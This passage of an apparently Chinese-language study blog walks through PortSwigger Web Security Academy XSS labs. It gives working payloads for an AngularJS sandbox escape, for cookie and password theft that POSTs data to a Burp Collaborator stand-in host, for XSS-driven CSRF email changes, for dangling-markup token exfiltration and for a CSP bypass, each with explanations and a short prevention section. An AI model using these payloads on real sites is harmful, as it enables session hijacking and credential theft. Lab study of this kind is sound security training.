type="1"><li><p>go to <code>exploit-server</code></p></li><li><p>payload(url解码后)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token operator">=</span><span class="token string">'https://0a1300ee045ddc06810c9e6200ad008e.web-security-academy.net/?search=&lt;input id=x ng-focus=$event.composedPath()|orderBy:'</span><span class="token punctuation">(</span>z<span class="token operator">=</span>alert<span class="token punctuation">)</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token string">'>#x'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ol type="1"><li><p><code>location</code>修改页面URL,跳转到漏洞页面,并传入payload。</p></li><li><p><code>search</code>参数用于传入payload。</p></li><li><p><code>ng-focus=$event.composedPath()</code>通过事件获取<code>$event</code>对象。</p></li><li><p><code>orderBy</code>过滤器遍历$event.path触发函数。</p></li><li><p><code>(z=alert)(document.cookie)</code>将alert赋给z,并读取cookie。</p></li><li><p>通过orderBy的遍历调用z,实现无window引用的代码执行。</p></li><li><p>成功绕过沙箱限制,弹出警告框。</p></li></ol><p>总结:</p><ul><li>ng-focus事件绕过CSP策略</li><li>orderBy过滤器遍历触发执行函数</li><li>赋值给变量规避window引用检测</li><li>成功逃逸AngularJS沙箱</li></ul><p>这是一个典型的结合语言特性进行的高级逻辑绕过攻击,可见防止沙箱逃逸的难度。</p></li><li><figure><img src="https://s2.loli.net/2023/08/08/tHWo7b8CqOJze2U.png"alt="image-20230808063406665" /><figcaption aria-hidden="true">image-20230808063406665</figcaption></figure><ol type="1"><li>store</li><li>send to victim</li></ol></li></ol><h4 id="exploiting-cross-site-scripting-vulnerabilities">Exploitingcross-site scripting vulnerabilities</h4><ol type="1"><li>三种最流行且功能强大的利用XSS漏洞的方法。<ol type="1"><li>使用弹窗函数：如前所述，简单地使用<code>alert()</code>函数来创建一个<strong>弹窗</strong>，以证明XSS漏洞的存在。这样的证明可能被用于漏洞报告或演示攻击者可以在受影响网站上执行任意JavaScript代码。</li><li><strong>Cookie盗取</strong>：通过XSS漏洞，攻击者可以在用户的浏览器中注入恶意代码，从而窃取用户的Cookie数据。一旦攻击者获得用户的Cookie，他们就可以模拟用户的会话，进行未经授权的操作。</li><li><strong>Session劫持</strong>：通过XSS漏洞，攻击者可以在用户的浏览器中注入恶意代码，从而在用户登录时捕获他们的会话令牌。攻击者可以使用捕获的令牌来劫持用户的会话，获取未经授权的访问权限。</li></ol></li><li>xss窃取Cookie的局限性<ol type="1"><li><strong>受害者可能未登录</strong>：如果受害者未登录或会话已过期，那么Cookie中可能不包含有用的信息。</li><li><strong>使用HttpOnly标记隐藏Cookie</strong>：许多应用程序在Cookie中使用HttpOnly标记，防止JavaScript访问Cookie，从而增加了攻击的难度。</li><li><strong>会话锁定</strong>：有些应用程序将会话与用户的IP地址等附加因素绑定，这样攻击者无法在其他地方使用会话。</li><li><strong>会话超时</strong>：攻击者可能需要时间来窃取和利用会话，但会话可能在攻击发生之前就已超时。</li></ol></li></ol><h5 id="lab-exploiting-cross-site-scripting-to-steal-cookies">Lab:Exploiting cross-site scripting to steal cookies</h5><ol type="1"><li><p>评论插入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span><span class="token literal-property property">body</span><span class="token operator">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ol type="1"><li><p>使用<code>fetch API</code>发起一个POST请求。</p></li><li><p>设置mode为<code>no-cors</code>,表示这是一个简单请求。</p></li><li><p>body中放入了document.cookie,会发送cookie内容。</p></li><li><p>请求<code>发送到</code>攻击者控制的域oastify.com。</p></li><li><p>由于是简单请求,浏览器<code>允许跨域</code>。</p></li><li><p>攻击者可以在oastify.com服务器上接收到含有cookie的POST数据。</p></li><li><p>这样就实现了利用XSS漏洞进行跨站数据窃取。</p></li></ol><p>原理总结:</p><ul><li>使用fetch API发起跨域请求</li><li>设置为简单请求绕过CORS</li><li>攻击者域名可接收数据</li><li>成功将数据发送到攻击者服务器</li></ul><p>这种技术手段巧妙利用了浏览器的同源策略漏洞,安全防护需要关注这类新型的跨站数据泄露风险。</p><ol type="1"><li>'https://BURP-COLLABORATOR-SUBDOMAIN' 来源于<imgsrc="https://s2.loli.net/2023/08/08/5Pz3hRHk7CN9qQB.png"alt="image-20230808072031393" /></li></ol></li><li><p>复制session<imgsrc="https://s2.loli.net/2023/08/08/v7WsRhAaPYCjq3D.png"alt="image-20230808072111938" /></p></li><li><p>repeater 替换成窃取的session</p></li></ol><h5 id="lab-exploiting-cross-site-scripting-to-capture-passwords">Lab:Exploiting cross-site scripting to capture passwords</h5><ol type="1"><li><p>原理同上</p></li><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>username</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>password</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>password</span> <span class="token special-attr"><span class="token attr-name">onchange</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span><span class="token literal-property property">body</span><span class="token operator">:</span>username<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span></code></pre></li><li><p>结果<img src="https://s2.loli.net/2023/08/08/gxHA2ToFvZJIsPX.png"alt="image-20230808073719391" /></p></li></ol><h5 id="lab-exploiting-xss-to-perform-csrf">Lab: Exploiting XSS toperform CSRF</h5><ol type="1"><li><p>更改账户邮箱时，需要anti-csrf token<imgsrc="https://s2.loli.net/2023/08/08/jzTBQ51ke9XntWh.png"alt="image-20230808075552337" /></p></li><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>onload <span class="token operator">=</span> handleResponse<span class="token punctuation">;</span>req<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span><span class="token string">'/my-account'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> token <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">name="csrf" value="(\w+)"</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> changeReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    changeReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'/my-account/change-email'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    changeReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'csrf='</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">'&amp;email=test@test.com'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ol type="1"><li><p>创建一个<code>XMLHttpRequest</code>请求,获取用户设置页面。</p></li><li><p>在响应中正则匹配提取<code>csrf token</code>的值。</p></li><li><p>构造<strong>另一个请求</strong>,修改邮箱为攻击者的邮箱。</p></li><li><p>在请求中包含提取的csrf token。</p></li><li><p>发送修改邮箱的请求,完成对目标用户的CSRF攻击。</p></li><li><p>当目标用户浏览包含此payload的页面时,会自动在用户浏览器中完成整个攻击链。</p></li><li><p>用户会被未知地修改邮箱至攻击者指定的地址。</p></li></ol></li></ol><h4 id="dangling-markup-injection">Dangling markup injection</h4><ol type="1"><li><code>悬挂式标记注入</code>（Dangling MarkupInjection）是一种在无法进行完整跨站脚本（XSS）攻击的情况下，捕获跨域数据的技术。</li></ol><h5id="lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack">Lab:Reflected XSS protected by very strict CSP, with dangling markupattack</h5><ol type="1"><li><p>paylaod插入exploit server</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'//BURP-COLLABORATOR-SUBDOMAIN?'</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=">&lt;a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me&lt;/a>&lt;base target='</span>'<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ol type="1"><li>如果<code>window.name</code>不为空,则发送一个图片请求,包含window.name的数据。</li></ol><ul><li>这个请求会发送到BurpCollaborator,被转发给<strong>攻击者</strong>。</li><li>window.name用于在页面间传递数据,可以包含<code>CSRF token</code>。</li></ul><ol start="2" type="1"><li>如果window.name为空,则重定向到一个包含XSS payload的URL。</li></ol><ul><li>XSSpayload是一个链接,当<strong>用户点击</strong>时,会向exploit服务器发送请求。</li><li>请求包含用户当前的CSRF token。</li><li>exploit服务器可以获取token用于后续CSRF攻击。</li></ul><p>它实现了XSS和CSRF攻击的组合利用。漏洞防范需要考虑各种攻击行为的协同效应。</p></li><li><p>处理这个请求<imgsrc="https://s2.loli.net/2023/08/08/EGKeiC9Hw3W6xIn.png"alt="image-20230808100839749" /></p><ol type="1"><li><figure><img src="https://s2.loli.net/2023/08/08/OTMtGc2sVf63JQj.png"alt="image-20230808223108176" /><figcaption aria-hidden="true">image-20230808223108176</figcaption></figure></li></ol></li><li><p>替换为窃取到的csrf token<imgsrc="https://s2.loli.net/2023/08/08/fOlXemxC35dog4y.png"alt="image-20230808100213085" /></p></li><li><p>copy html<imgsrc="https://s2.loli.net/2023/08/08/8qACd1Y2KotkMDF.png"alt="image-20230808100259790" /></p></li><li><p>返回exploit server,粘贴<imgsrc="https://s2.loli.net/2023/08/08/4yucjeh7dgvSQaJ.png"alt="image-20230808100335605" /></p></li><li><p>生成的html分析</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a7d00e0049f116f800a12ff0082002d.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hacker<span class="token entity" title="&#64;">&amp;#64;</span>evil<span class="token entity" title="&#45;">&amp;#45;</span>user<span class="token entity" title="&#46;">&amp;#46;</span>net<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>YFJA9CBLWed2lWvbngdLmaE6S8Bt3Hw4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><ol type="1"><li><p><code>&lt;html&gt;</code>：这是HTML文档的根元素。</p></li><li><p><code>&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</code>：这是一个注释，说明这段代码是由BurpSuite Professional生成的用于漏洞利用的CSRF攻击演示。</p></li><li><p><code>&lt;body&gt;</code>：这是HTML文档的主体部分，包含了页面内容。</p></li><li><p><code>&lt;form action="https://0a7d00e0049f116f800a12ff0082002d.web-security-academy.net/my-account/change-email" method="POST"&gt;</code>：这是一个表单元素，用于构造一个POST请求，目标URL是<code>https://0a7d00e0049f116f800a12ff0082002d.web-security-academy.net/my-account/change-email</code>，这是用于修改用户邮箱的功能。</p></li><li><p><code>&lt;input type="hidden" name="email" value="hacker&amp;#64;evil&amp;#45;user&amp;#46;net" /&gt;</code>：这是一个隐藏的输入域，用于设置待修改的邮箱地址为<code>hacker@evil-user.net</code>。</p></li><li><p><code>&lt;input type="hidden" name="csrf" value="YFJA9CBLWed2lWvbngdLmaE6S8Bt3Hw4" /&gt;</code>：这是一个隐藏的输入域，用于设置CSRF令牌的值。</p></li><li><p><code>&lt;input type="submit" value="Submit request" /&gt;</code>：这是一个提交按钮，当用户点击时，将提交表单数据到指定的URL。</p></li><li><p><code>&lt;script&gt;</code>：这是一个JavaScript代码块的开始。</p></li><li><p><code>history.pushState('', '', '/');</code>：这是HTML5的<code>history.pushState()</code>方法，它会修改浏览器的历史记录，将当前URL改为<code>/</code>。这可能是为了在用户执行操作后不留下痕迹。</p></li><li><p><code>document.forms[0].submit();</code>：这行代码通过JavaScript来自动提交表单，实际触发了一个POST请求，将修改用户邮箱的请求发送到目标URL。总的来说，这段代码是一个伪造的CSRF攻击工具，用于自动提交修改用户邮箱的请求，以利用目标网站上的CSRF漏洞。攻击者可以将这段代码嵌入到恶意页面中，当受害者访问该页面并且已经登录到目标网站时，这段代码会自动触发修改邮箱的请求，从而导致受害者的邮箱被修改。</p></li></ol></li></ol><h4 id="content-security-policy">Content security policy</h4><ol type="1"><li><p><code>内容安全策略</code>（CSP，Content SecurityPolicy）是一种浏览器安全机制，旨在减轻跨站脚本（XSS）和一些其他攻击。其工作原理是通过<strong>限制</strong>页面可以加载的资源（如脚本和图像），以及限制页面是否可以被其他页面框架来实现。</p><p>为了启用CSP，响应需要包括一个名为<code>Content-Security-Policy</code>的HTTP响应头，其值包含策略信息。策略本身由一个或多个指令组成，用分</p><p>号分隔。</p></li></ol><h5id="lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-1">Lab:Reflected XSS protected by very strict CSP, with dangling markupattack</h5><ol type="1"><li>即上一个lab</li></ol><h5 id="lab-reflected-xss-protected-by-csp-with-csp-bypass">Lab:Reflected XSS protected by CSP, with CSP bypass</h5><ol type="1"><li><p>test <code>payload</code></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span></code></pre></li><li><p>抓包<img src="https://s2.loli.net/2023/08/08/fSOVpjGsCY2Hrab.png"alt="image-20230808230158902" /></p><figure><img src="https://s2.loli.net/2023/08/08/PZYA8ezkxnp6XVm.png"alt="image-20230808230340036" /><figcaption aria-hidden="true">image-20230808230340036</figcaption></figure></li><li><p>payload,只能在地址栏，需要<code>URl编码</code></p><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;?search&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&amp;token&#x3D;;script-src-elem &#39;unsafe-inline&#39;</code></pre></li><li><figure><img src="https://s2.loli.net/2023/08/08/tMrRmxbjAL8ZC34.png"alt="image-20230808230506198" /><figcaption aria-hidden="true">image-20230808230506198</figcaption></figure></li></ol><h4 id="how-to-prevent-xss">How to prevent XSS</h4><ol type="1"><li><strong>在输出时对数据进行编码</strong>：在将数据显示在网页上之前，确保对数据进行适当的编码，以防止恶意脚本被解释和执行。不同类型的数据（文本、HTML、JavaScript等）需要不同的编码方法。</li><li><strong>在输入到达时验证数据</strong>：在数据到达应用程序之前，对输入数据进行验证和过滤，以确保其符合预期的格式和内容。例如，可以检查输入中是否包含恶意脚本标签。</li></ol><h3 id="cross-site-scripting">Cross-site scripting</h3><h4 id="exploiting-cross-site-scripting-vulnerabilities-1">Exploitingcross-site scripting vulnerabilities</h4><ul><li><p><strong>lab-steal cookies</strong></p><ul><li><p><strong>Session 和 Cookie</strong></p><p>是 Web 开发中常用的两个概念，但它们之间有着本质上的不同。</p><p>Cookie是一种存储在客户端浏览器中的小型文本文件，用于记录用户在访问网站时的相关信息。例如，登录凭证、购物车中的商品信息等都可以通过Cookie 来进行记录。Cookie 可以通过设置过期时间来控制其存储的时长。</p><p>Session则是指服务器与客户端之间的一种会话机制。当用户访问某个网站时，服务器会为其创建一个唯一的Session ID，并将其存储在服务器端。客户端的浏览器会将这个 Session ID存储在 Cookie 中，并在后续的请求中自动携带。服务器可以通过这个 SessionID 来识别当前的用户，从而实现跨页面的数据共享。与 Cookie不同的是，Session数据的存储位置是在服务器端的内存或磁盘上，而非客户端浏览器中。</p><p>总的来说，Cookie适合存储一些用户的持久化数据，如登录状态、购物车数据等，而 Session更适合存储一些临时数据，如验证码、表单信息等。在实际的应用中，Cookie 和Session 通常会结合使用，来满足不同的需求。</p></li></ul><ol type="1"><li><p>构建一个脚本</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span><span class="token literal-property property">body</span><span class="token operator">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>获取自己服务器的子域名<imgsrc="https://s2.loli.net/2023/04/05/CgJlEjZ6ADGdX4K.png"alt="image-20230405162357049" /></p></li><li><p>在博客评论区发表评论</p></li><li><p>等待服务器出现结果<imgsrc="https://s2.loli.net/2023/04/05/eZvJHk8IcLqumhp.png"alt="image-20230405162446313" /></p></li></ol></li><li><p><strong>lab：capture passwords</strong></p><p>获取用户名和密码的payload,其他同上一个lab</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input name<span class="token operator">=</span>username id<span class="token operator">=</span>username<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span>password name<span class="token operator">=</span>password onchange<span class="token operator">=</span>"<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://BURP-COLLABORATOR-SUBDOMAIN'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span><span class="token punctuation">,</span><span class="token literal-property property">body</span><span class="token operator">:</span>username<span class="token punctuation">.</span>value<span class="token operator">+</span><span class="token string">':'</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>"<span class="token operator">></span></code></pre></li><li><p><strong>lab:perform CSRF</strong></p><ol type="1"><li>依然是利用评论区的Xss漏洞，注入如下payload</li></ol><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span>onload <span class="token operator">=</span> handleResponse<span class="token punctuation">;</span>req<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span><span class="token string">'/my-account'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> token <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">name="csrf" value="(\w+)"</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> changeReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    changeReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'/my-account/change-email'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    changeReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'csrf='</span><span class="token operator">+</span>token<span class="token operator">+</span><span class="token string">'&amp;email=test@test.com'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ol start="2" type="1"><li><p>当其他用户打开这条评论时，就会执行上述的脚本，执行过程如下：</p><ol type="1"><li>构造一个新的请求，发送该请求到指定url</li><li>设定接受到服务器响应的回调函数为handleResponse</li><li>当服务器返回响应，执行该回调函数<ol type="1"><li>提取响应报文中的token</li><li>提取用户账号，密码</li><li>使用以上信息发送一个新的请求（修改电子邮件）</li></ol></li></ol></li><li><p>解释：</p><p>通常情况下，<code>GET</code> 请求用于从服务器获取资源，而<code>POST</code>请求用于向服务器提交数据并请求操作，比如创建、更新或删除资源。在这种情况下，第一次请求用于获取用户的CSRF token，不需要提交任何数据，因此使用 GET请求即可。第二次请求用于提交修改用户邮箱地址的请求，需要将新的邮箱地址和CSRF token 一起提交给服务器，因此使用 POST 请求方式。</p><p>需要注意的是，CSRF token的获取和使用必须在同一个域名下进行，否则由于跨域限制，无法获取到 token或者无法使用 token 进行攻击。</p></li></ol></li></ul><h4 id="cross-site-scripting-xss-cheat-sheet">Cross-site scripting (XSS)cheat sheet</h4><ul><li><p><strong>Lab: Reflected XSS into HTML context with most tags andattributes blocked</strong></p><p>key words:<code>reflected XSS</code>,<code>blocked</code></p><ol type="1"><li><p>随便用一个payload测试<imgsrc="https://s2.loli.net/2023/04/07/v5i3ZQO7aTyrJqd.png"alt="image-20230407001101034" /></p></li><li><p>tag入侵<imgsrc="https://s2.loli.net/2023/04/07/gG1eXVcb3N7FT2D.png"alt="image-20230407001352435" /></p></li><li><p>结果<img src="https://s2.loli.net/2023/04/07/gG1eXVcb3N7FT2D.png"alt="none" /></p></li><li><p>同理测试event<imgsrc="https://s2.loli.net/2023/04/07/M1YFH7r6pOxgWBL.png"alt="image-20230407001954896" /></p><p>result: <img src="https://s2.loli.net/2023/04/07/GsjKVnENAdpfICU.png"alt="image-20230407002042334" /></p></li><li><p>最终payload</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onresize</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>" onload=this.style.width='100px'>    // YOUR-LAB-ID: 博客主页面ID    </code></pre><p>解析：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token 